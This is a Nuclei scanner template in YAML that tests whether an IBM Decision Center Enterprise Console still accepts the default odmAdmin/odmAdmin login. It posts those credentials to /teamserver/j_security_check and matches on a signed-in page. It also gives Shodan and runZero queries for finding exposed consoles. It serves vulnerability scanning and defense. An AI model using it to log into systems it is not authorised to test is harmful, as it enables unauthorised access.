id: ibm-dcec-default-login
info:
  name: IBM Decision Center Enterprise Console - Default Login
  author: DhiyaneshDK
  severity: high
  reference:
    - https://www.ibm.com/docs/en/odm/8.5.1?topic=console-tutorial-getting-started-decision-center-enterprise
  metadata:
    runzero-match: service["http.body"] matches "Decision Center Enterprise console"
    max-request: 1
    shodan-query: html="Decision Center Enterprise console"
    verified: true
  tags: decision-center,default-login,ibm,vuln
http:
  - attack: pitchfork
    host-redirects: true
    matchers:
      - condition: and
        part: body
        type: word
        words:
          - 'Current action:'
          - Sign Out
      - status:
          - 200
        type: status
    matchers-condition: and
    max-redirects: 3
    payloads:
      password:
        - odmAdmin
      username:
        - odmAdmin
    raw:
      - |
        POST /teamserver/j_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username={{username}}&j_password={{password}}
